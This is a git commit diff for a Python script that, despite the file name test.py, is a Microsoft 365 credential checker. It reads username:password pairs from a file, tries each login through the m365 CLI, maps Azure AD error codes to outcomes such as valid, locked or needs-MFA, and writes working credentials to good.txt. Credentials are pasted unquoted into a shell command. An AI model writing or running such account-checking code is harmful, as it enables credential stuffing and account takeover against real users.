8dd13ec547e59781e1c190dbe3a3854f149e3930
xcgx <36234354+xcgx@users.noreply.github.com>
2022-04-13 23:51:15 +0800

    Update and rename test_env.py to test.py

--- test.py
+++ test.py
@@ -3,17 +3,71 @@ import os
 import platform
 import subprocess
 import datetime
+import numpy as np
+import pandas as pd
+import threading
+
+######  acc  part
+accs = np.array(pd.read_table("./acc.txt", dtype=str, sep=':', usecols=(0, 1), encoding='utf-8', skip_blank_lines=True, header=None))
 
 
+sem_num = 10
+sem = threading.Semaphore(sem_num)
 
 def run():
     if test_m365() == 'true':
         print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始运行')
-        print('运行状态OK')
+        with sem:
+            for acc in accs:
+                try:
+                    if get_status(acc) == '密码正确':
+                        print(acc[0] + ':' + acc[1] + ' good')
+                        good = acc[0] + ':' + acc[1]
+                        with open('./good.txt', 'a', encoding='utf-8') as fa:
+                            fa.write(good)
+                            fa.write('\n')
+                    elif get_status(acc) == '需要添加二验':
+                        print(acc[0] + ':' + acc[1] + ' manual')
+                        manual = acc[0] + ':' + acc[1]
+                        with open('./manual.txt', 'a', encoding='utf-8') as fa:
+                            fa.write(manual)
+                            fa.write('\n')
+                    else:
+                        print(acc[0] + ':' + acc[1] + ' bad')
+                except Exception as e:
+                    pass
+        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 完成运行')
     else:
         print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 运行结束')
 
 
+def get_status(acc):
+    shell_content = 'm365 login  --authType password --userName ' + acc[0] + ' --password ' + acc[1]
+    status = subprocess.getoutput(shell_content)
+    # print(status)
+    if '65001' in str(status):
+        return '密码正确'
+    elif '50034' in str(status):
+        return '账户不存在'
+    elif '50126' in str(status):
+        return '密码错误'
+    elif '53003' in str(status):
+        return 'IP限制'
+    elif '50057' in str(status):
+        return '管理ban'
+    elif '50059' in str(status):
+        return '被删号'
+    elif '50053' in str(status):
+        return '被暴力破解，自动ban'
+    elif '90019' in str(status):
+        return '账号错误'
+    elif '50076' in str(status):
+        return '需要二验'
+    elif '50079' in str(status):
+        return '需要添加二验'
+    else:
+        print(status)
+        return '未知错误'
 
 
 def test_npm():
@@ -23,7 +77,7 @@ def test_npm():
         npm_ver = '0'
 
     if eval(npm_ver[0:1]) >= 6:
-        print('当前npm版本为' + npm_ver + '将继续运行')
+        print('当前npm版本为' + str(npm_ver) + '将继续运行')
         return 'true'
     else:
         print('npm未安装或版本过低，尝试自动安装...')
@@ -64,10 +118,10 @@ def test_m365():
             m365_ver = subprocess.check_output('m365 version', shell=True)
         except Exception as e:
             m365_ver = '0'
-        if m365_ver is '0':
+        if m365_ver == '0':
             print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + ' 开始安装m365')
             os.system('npm install -g @pnp/cli-microsoft365')
-        elif m365_ver[1:2] is 'v':
+        elif 'v' in str(m365_ver):
             print('m365环境正常')
             return 'true'
         else:
@@ -80,14 +134,11 @@ def test_m365():
         m365_ver = subprocess.check_output('m365 version', shell=True)
     except Exception as e:
         m365_ver = '0'
-    if m365_ver[1:2] is 'v':
+    if 'v' in str(m365_ver):
         print('m365环境正常')
         return 'true'
     else:
         print('未知错误，请尝试手动安装m365')
         return 'false'
-
-
-
 
 run()
